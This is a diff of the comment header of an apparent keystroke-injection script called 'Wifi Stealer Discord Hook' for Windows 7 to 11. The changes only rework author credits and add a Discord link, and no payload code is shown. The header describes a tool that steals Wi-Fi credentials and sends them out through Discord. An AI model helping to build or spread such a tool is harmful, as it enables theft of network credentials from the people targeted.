@@ -1,6 +1,7 @@
 REM Title: Wifi Stealer Discord Hook 
-REM Author: Blobs0
-REM Reworked: fork of 7h30th3r0n3 'Wifi_Stealer'
+REM Author: 7h30th3r0n3
+REM Reworked : the0bone 
+REM Discord Reworked: Blobs0 https://discord.com/channels/937479784148115456/1020414009339551885/1056675125224816690 (Unleash discord)
 REM Target:  Windows 7/8/10/11 
 REM Supported Layout keyboard: US/FR/DE
 REM Version: 1.0
